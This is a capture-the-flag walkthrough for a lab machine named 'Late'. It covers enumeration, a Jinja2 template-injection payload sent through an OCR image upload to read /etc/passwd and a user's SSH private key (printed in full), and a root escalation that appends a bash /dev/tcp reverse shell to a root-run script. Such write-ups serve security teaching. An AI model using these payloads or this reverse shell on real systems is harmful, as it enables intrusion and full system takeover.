# Late

## Enumeration

First, let's enumerate the accessible ports and services using **nmap**:

![Nmap scan results](images/Untitled.png)

We observe that there is a web application running on port 80 (default HTTP). When we access the website, we find a "Home" page and a "Contact" page. The latter has a form that does not actually send any request to the server, so it is just for show.

![Home page](images/Untitled%201.png)

![Contact page](images/Untitled%202.png)

We can extract the domain name from the email address in the footer ("support@late.htb"). Additionally, on the *Home* page, we find a link to `images.late.htb`, which is a subdomain. After adding these to the `/etc/hosts` file:

![Configured /etc/hosts file](images/Untitled%203.png)

### Directory and Subdomain Enumeration

Using gobuster and [SecLists](https://github.com/danielmiessler/SecLists):

```bash
gobuster dir -w ~/SecLists/Discovery/Web-Content/raft-small-directories.txt -u 10.10.11.156
gobuster dns -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -d late.htb
```

No directories were discovered during directory enumeration, and subdomain enumeration only confirmed `images.late.htb`, which we already knew:

![Subdomain enumeration results](images/Untitled%204.png)

### Analyzing images.late.htb

We find a service that detects text in an image and converts it into plain text (OCR). The application is quite finicky, and there is a high chance it will not recognize text in the image, even if it is very clear.

![OCR Web application page](images/Untitled%205.png)

## Exploitation

We will use ImageMagick to perform some tests:

```bash
convert -gravity center -background black -fill white -size 2000x300 caption:'test' test.png
```

With this command, we create an image containing the text "test":

![Generated image with test text](images/Untitled%206.png)

Upon uploading it to the website, the output is a **.txt** file with the following content:

```html
<p>test
</p>
```

This HTML `<p>` tag is suspicious. Let's test for Server-Side Template Injection (SSTI) using the following image:

![SSTI test image](images/testssti.png)

We observe the following behavior:

![SSTI test result](images/Untitled%207.png)

Testing with a specific syntax:

![Specific SSTI test image](images/testssti2.png)

```html
<p>12
</p>
```

This confirms the presence of SSTI. Since the application is built using **Flask**, it is highly probable that the template engine is **Jinja2**, which is the default.

Testing another payload:

![Jinja2 test payload image](images/Untitled%208.png)

```html
<p>444
</p>
```

This behavior is indeed expected for **Jinja2**!

![SSTI decision tree](images/ssti.png)

Source: [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)

Exploiting this vulnerability to read files from the system:

```jinja2
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![Reading /etc/passwd](images/passwd2.png)

```text
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin

</p>
```

Note the `svc_acc` user; they are likely the user running the application. We can see they left their private SSH key in their `.ssh` directory:

![Reading SSH private key](images/ssh.png)

```text
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

## Post-Exploitation

We just need to save this key and log in as the user via **SSH**:

```bash
ssh -i sshkey svc_acc@10.10.11.156
```

We locate the user flag:

```bash
cat user.txt
```

### Privilege Escalation

Uploading **linpeas** and **pspy** to the machine:

![Uploading scripts](images/Untitled%209.png)

Granting execution permissions:

```bash
chmod +x linpeas.sh pspy
```

Running **linpeas** reveals the following file:

![linpeas output showing ssh-alert.sh](images/Untitled%2010.png)

We see that we own this file and have the **append** attribute set (flag **a** in the output).

This **ssh-alert.sh** script seems to send an email to root every time someone logs in via **SSH**. Let's test this functionality and monitor it using **pspy**:

![pspy output showing ssh-alert.sh execution](images/Untitled%2011.png)

Notice that the script (**ssh-alert.sh**) is executed by root (UID=0) when a user logs in. Knowing this, we can edit this script so that when root executes it, we obtain a reverse shell.

```bash
echo 'bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1' >> /usr/local/sbin/ssh-alert.sh
```

On your host terminal:

```bash
nc -lnvp PORT
```

After logging in again as `svc_acc`, we obtain root access:

```bash
cat /root/root.txt
```